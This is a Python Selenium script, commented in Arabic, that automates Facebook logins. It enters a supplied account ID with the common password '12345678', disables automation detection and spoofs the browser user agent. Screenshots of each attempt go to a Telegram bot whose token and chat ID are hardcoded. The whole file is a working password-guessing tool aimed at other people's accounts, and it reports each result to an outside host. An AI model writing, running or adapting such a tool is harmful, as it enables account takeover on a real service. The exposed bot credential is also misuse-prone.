import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def send_photo_tg(photo_path, caption):
    try:
        with open(photo_path, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
    except: pass

def check_account(uid):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    options.add_argument('--window-size=1920,1080')

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    try:
        pas = "12345678"
        driver.get("https://www.facebook.com")
        time.sleep(5)
        
        # إدخال البيانات
        email_field = driver.find_element(By.NAME, "email")
        pass_field = driver.find_element(By.NAME, "pass")
        
        email_field.send_keys(uid)
        time.sleep(1)
        pass_field.send_keys(pas)
        time.sleep(1)
        
        # لقطة قبل المحاولة
        img_pre = f"pre_{uid}.png"
        driver.save_screenshot(img_pre)
        send_photo_tg(img_pre, f"📸 تم إدخال البيانات لـ: {uid}")

        # --- محاولات الضغط الذكية ---
        try:
            # 1. محاولة الضغط عبر Enter
            pass_field.send_keys(Keys.RETURN)
            print("Done with Enter")
        except:
            # 2. محاولة البحث عن الزر بالاسم والضغط عليه بـ JS
            driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
            print("Done with JS Click")
        
        time.sleep(8) # انتظار التحميل بعد الضغط
        
        # لقطة بعد المحاولة (لمعرفة هل انتقل لصفحة أخرى أم لا)
        img_post = f"post_{uid}.png"
        driver.save_screenshot(img_post)
        send_photo_tg(img_post, f"🔄 النتيجة النهائية لـ: {uid}")
        
        if os.path.exists(img_pre): os.remove(img_pre)
        if os.path.exists(img_post): os.remove(img_post)
        
    except Exception as e:
        send_to_tg(f"❌ خطأ فني: {str(e)}")
    finally:
        driver.quit()

if __name__ == "__main__":
    send_to_tg("🚦 بدء الفحص (V62) بميزة الضغط الذكي...")
    check_account("26701173") # تجربة حساب واحد للتأكد من الضغط
